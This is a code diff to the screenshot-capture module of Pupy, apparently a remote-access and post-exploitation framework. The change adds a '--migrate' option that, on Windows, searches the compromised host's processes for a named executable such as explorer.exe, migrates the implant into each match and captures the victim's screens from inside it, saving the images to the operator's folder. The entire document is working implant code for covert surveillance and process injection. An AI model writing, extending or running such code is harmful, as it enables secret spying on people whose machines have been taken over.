@@ -33,6 +33,7 @@
 from pupylib.PupyModule import *
 from pupylib.PupyConfig import PupyConfig
 from os import path
+from modules.lib.windows.migrate import migrate as win_migrate
 
 import datetime
 import subprocess
@@ -40,7 +41,7 @@ import subprocess
 __class_name__="Screenshoter"
 
 
-@config(cat="gather",compatibilities=['windows', 'linux', 'darwin'])
+@config(cat="gather")
 class Screenshoter(PupyModule):
     """ take a screenshot :) """
 
@@ -51,40 +52,78 @@ class Screenshoter(PupyModule):
         self.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
         self.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
         self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
+        self.arg_parser.add_argument('-t', '--timeout', type=int, default=30, help='time in seconds to wait for the connection')
+        self.arg_parser.add_argument('-m', '--migrate', type=str, default='', help='take the screenshot form the point of view of the <process> (ie: C:\\\\windows\\\\explorer.exe)(Do not forget the \\\\)')
 
     def run(self, args):
         rscreenshot = self.client.conn.modules['screenshot']
-        if self.client.is_android()==True:
-            self.error("Android target, not implemented yet...")
-        else:
-            if args.enum:
-                self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
-                for i, screen in enumerate(rscreenshot.screens()):
-                    if not (screen['width'] and screen['height']):
-                        continue
+        if args.enum:
+            self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
+            for i, screen in enumerate(rscreenshot.screens()):
+                if not (screen['width'] and screen['height']):
+                    continue
 
-                    self.rawlog('{:>2}: {:>9} {:>9}\n'.format(
-                        i,
-                        '{}x{}'.format(screen['width'], screen['height']),
-                        '({}x{})'.format(screen['top'], screen['left'])))
-                return
+                self.rawlog('{:>2}: {:>9} {:>9}\n'.format(
+                    i,
+                    '{}x{}'.format(screen['width'], screen['height']),
+                    '({}x{})'.format(screen['top'], screen['left'])))
+            return
 
-            config = self.client.pupsrv.config or PupyConfig()
-            folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
+        config = self.client.pupsrv.config or PupyConfig()
+        folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
+        
+        if args.migrate:
+            if self.client.is_windows():
+                rpupyps = self.client.conn.modules.pupyps
+                root, tree, data = rpupyps.pstree()
+                args.migrate = args.migrate.lower();
+                count_process = 0
 
-            rscreenshot.takeScreenshot()
-            screenshots, error = rscreenshot.screenshot(args.screen)
-            if not screenshots:
-                self.error(error)
+                for pid in data:
+                    if data[pid]['exe'] and data[pid]['exe'].lower() == args.migrate:
+                        count_process += 1;
+                        c = win_migrate(self, pid, True, args.timeout);
+                        rscreenshot = c.conn.modules['screenshot'];
+                        screenshots, error = rscreenshot.screenshot(args.screen);
+                        if not screenshots:
+                            self.error(error)
+                        else:
+                            self.success('number of monitor detected: %s' % str(len(screenshots)))
+
+                            for i, screenshot in enumerate(screenshots):
+                                filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
+                                with open(filepath, 'w') as out:
+                                    out.write(screenshot)
+                                    self.success(filepath)
+
+                                if args.view:
+                                    viewer = config.get('default_viewers', 'image_viewer')
+                                    subprocess.Popen([viewer, filepath])
+                        c.conn.exit()
+#                        c.conn._conn.close() # force the socket to close and clean sessions list
+                if count_process == 0:
+                    self.error('process not found. No screenshot for that host')
             else:
-                self.success('number of monitor detected: %s' % str(len(screenshots)))
+                self.error('unsupported platform')
+            return ;
+            
+        screenshots, error = rscreenshot.screenshot(args.screen)
+        if not screenshots:
+            self.error(error)
+        else:
+            self.success('number of monitor detected: %s' % str(len(screenshots)))
 
-                for i, screenshot in enumerate(screenshots):
-                    filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
-                    with open(filepath, 'w') as out:
-                        out.write(screenshot)
-                        self.success(filepath)
+            for i, screenshot in enumerate(screenshots):
+                filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
+                with open(filepath, 'w') as out:
+                    out.write(screenshot)
+                    self.success(filepath)
 
-                    if args.view:
-                        viewer = config.get('default_viewers', 'image_viewer')
-                        subprocess.Popen([viewer, filepath])
+                if args.view:
+                    viewer = config.get('default_viewers', 'image_viewer')
+                    subprocess.Popen([viewer, filepath])
+
+
+
+
+
